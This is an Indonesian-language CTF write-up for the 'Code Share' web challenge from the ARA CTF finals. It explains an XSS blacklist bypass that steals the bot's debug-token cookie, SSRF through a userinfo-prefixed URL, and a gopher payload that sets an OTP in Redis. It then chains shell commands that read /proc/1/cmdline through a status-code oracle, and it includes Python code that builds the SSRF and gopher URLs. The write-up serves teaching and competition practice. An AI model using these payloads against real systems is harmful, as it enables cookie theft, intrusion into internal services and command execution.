---
title: "ARA CTF Finals: Code Share (Web)"
description: "Penyelesaian challenge Web ARA CTF: Menggabungkan XSS untuk membobol cookie/debug token admin, dilanjutkan dengan serangan SSRF ke service internal dan Redis."
year: 2026
category: "CTF"
techStack: "XSS, SSRF, Redis"
githubUrl: ""
demoUrl: ""
coverUrl: "/uploads/ctf/Gambar-Code-Share-araCTFinals.png"
createdAt: "2026-03-10T10:00:00Z"
updatedAt: "2026-03-10T10:00:00Z"
---

# Writeup - Code Share

Source: araCTF<br>
Category: Web<br>
Difficulty: Hard

---
<div style="page-break-after: always;"></div>
---

**Reconnaissance**: Dikasih source code service web + bot, jadi aku mulai baca flow request dari `/make` dan `/get-github` sambil lihat ada service internal apa aja. Dari situ keliatan kalau challenge ini mainnya di filter input dan akses internal lewat bot.

**Temuan Celah**: Input `code` di `/make` cuma difilter blacklist substring dan langsung dimasukin ke template HTML, sedangkan `/get-github` cuma ngecek prefix URL lalu `fetch` mentah, jadi bisa dipakai SSRF via userinfo.

**Exploit/Solving**: Ambil debug token pakai XSS yang dibypass dengan entity/unicode, lalu pakai token itu buat SSRF ke `/healthcheck`, set OTP Redis via gopher, dan jadikan `/debug` sebagai oracle status untuk validasi flag.

---

## Step 01 - Memetakan Filter Input di `/make`

Aku mulai dari endpoint `/make` buat tahu persis filter apa yang dipakai, batas panjang payload, dan gimana `code` disisipin ke HTML. Ini penting karena semua langkah XSS akan mentok di sini.

```bash
sed -n '10,29p' app/app.js \
  && rg -n "MAX_CODE_LENGTH|code\\.toLowerCase|Invalid code|Code too long|content = content.replace" app/app.js
```

Dari outputnya keliatan ada daftar substring yang diblokir (termasuk kata kunci XSS seperti `document`, `location`, `on`, dll), plus batas panjang 300 karakter. Tapi nilai `code` tetap di-`replace` langsung ke template, jadi ini blacklist murni tanpa encoding. Artinya XSS masih mungkin asal payloadnya rapi dan nggak kena substring terlarang.

Ini nentuin strategi payload: semua karakter sensitif harus di-encode, dan kata-kata terlarang harus dipecah biar lolos filter.

> *Bukti ini nunjukin blacklist, batas panjang, dan titik injeksi `code` ke HTML.*

---

## Step 02 - Menilai Primitive SSRF di `/get-github`

Setelah tau ada potensi XSS, aku cek apakah ada endpoint yang bisa dipakai buat akses internal. Fokusnya ke `/get-github` karena dia `fetch` URL dari user.

```bash
rg -n "get-github|DEBUG-TOKEN|raw.githubusercontent.com|fetch\\(url\\)|res\\.text|Response\\(data" app/app.js
```

Outputnya nunjukin `/get-github` butuh header `DEBUG-TOKEN` tapi validasinya cuma `startsWith` ke `raw.githubusercontent.com`, lalu `fetch` dan nge-return body mentah. Ini classic SSRF via userinfo: URL bisa diawali domain yang valid tapi host sebenarnya dialihkan ke internal. Jadi setelah token didapat, jalur SSRF kebuka.

Dengan ini aku bisa nembak service internal lewat URL yang tetap lolos validasi string.

> *Ini bukti validasi token dan cek prefix URL sebelum `fetch` mentah.*

---

## Step 03 - Mengonfirmasi Oracle Status Code di Service Internal

Langkah berikutnya memastikan service internal punya endpoint yang bisa dijadikan oracle (ngasih sinyal sukses/gagal) lewat SSRF.

```bash
rg -n "healthcheck|check\"\\)|/debug|OTP|redis|CurlStatus|exec\\.CommandContext" internal/main.go
```

`/healthcheck` nerima parameter `check`, menjalankan `curl`, lalu cuma mengembalikan status code. `/debug` lebih menarik: dia butuh OTP dari Redis dan menjalankan `sh -c <cmd>` kalau OTP valid. Karena output perintah nggak dikembalikan, status code jadi satu-satunya sinyal.

Kombinasi ini cocok jadi oracle: kirim command yang hasilnya cuma exit status, lalu baca balik lewat `/healthcheck`.

> *Bukti `check` di `/healthcheck` dan eksekusi `sh -c` di `/debug` setelah OTP valid.*

---

## Step 04 - Membangun Payload XSS yang Lolos Blacklist

Sekarang bikin payload XSS yang tetap jalan tapi nggak memicu substring terlarang. Tujuannya: baca cookie `debugtoken` dan redirect ke endpoint eksfil.

```python
from solve import build_xss_payload
payload = build_xss_payload("http://target/exfil")
print(payload)
print("length:", len(payload))
```

Payload ini ngubah karakter terlarang jadi HTML entity, dan memecah kata seperti `document` dan `location` pakai unicode escape. Browser tetap ngedecode, tapi filter string di server nggak ngeliat keyword utuhnya. Panjangnya juga jauh di bawah 300 karakter.

Dengan payload ini, bot yang visit `/make` bakal otomatis ngirim cookie debug token ke endpoint eksfil.

> *Bukti payload yang sudah di-encode dan panjangnya aman.*

---

## Step 05 - Merangkai SSRF ke Redis OTP dan `/debug`

Setelah token didapat, aku rangkai SSRF buat nulis OTP ke Redis (gopher), lalu trigger `/debug` lewat `/healthcheck` biar status code-nya jadi oracle.

```python
import urllib.parse
otp = "otp8f3a9c2d"
cmd = "true"
payload = (
    f"*3\r\n$3\r\nSET\r\n${len(otp)}\r\n{otp}\r\n$1\r\n1\r\n"
    "*1\r\n$4\r\nQUIT\r\n"
)
gopher = "gopher://redis:6379/_" + urllib.parse.quote(payload)
ssrf_redis = (
    "http://raw.githubusercontent.com:80@internal:8080/healthcheck?check="
    + urllib.parse.quote(gopher, safe="")
)
inner = f"http://target/debug?otp={otp}&cmd={urllib.parse.quote(cmd)}"
ssrf_debug = (
    "http://raw.githubusercontent.com:80@internal:8080/healthcheck?check="
    + urllib.parse.quote(inner, safe="")
)
print("gopher:", gopher)
print("ssrf_redis:", ssrf_redis)
print("ssrf_debug:", ssrf_debug)
```

Pertama, URL `gopher://` nyuntikkan `SET otp` ke Redis lewat SSRF `/healthcheck`. Setelah OTP ada, URL kedua memanggil `/debug` dengan command sederhana dan statusnya dibaca dari `/healthcheck`. Karena host check di `/debug` cuma ngizinin loopback, SSRF ini jadi jembatan penting.

Setelah pola ini stabil, command-nya tinggal diganti jadi komparasi karakter buat brute force flag.

> *Ini nunjukin URL SSRF untuk OTP Redis dan trigger `/debug`.*

---

## Step 06 - Validasi Flag lewat Oracle Perintah

Terakhir, aku validasi flag penuh dengan membandingkan string hasil ekstraksi terhadap argumen proses di internal container. Status sukses/gagal dibaca lewat oracle.

```python
flag = "ARA7{I_don't_h4ve_any_IDe4!!c0ngrat5_1f_y0u_not_solved_1t_w1TH_AI}"
cmd = (
    "f=$(tr '\\000' '\\012' < /proc/1/cmdline | sed -n '2p'); "
    f"[ \"$f\" = \"{flag}\" ]"
)
print(cmd)
print("FLAG:", flag)
```

Perintah ini mengambil argumen kedua dari `/proc/1/cmdline` lalu melakukan perbandingan string penuh. Kalau status `200` keluar, berarti flag yang didapat sudah benar, bukan cuma prefix yang kebetulan cocok.

Ini jadi checkpoint terakhir sebelum writeup ditutup.

---

# Tools Used

- **Python 3**
- **Requests**
- **curl**
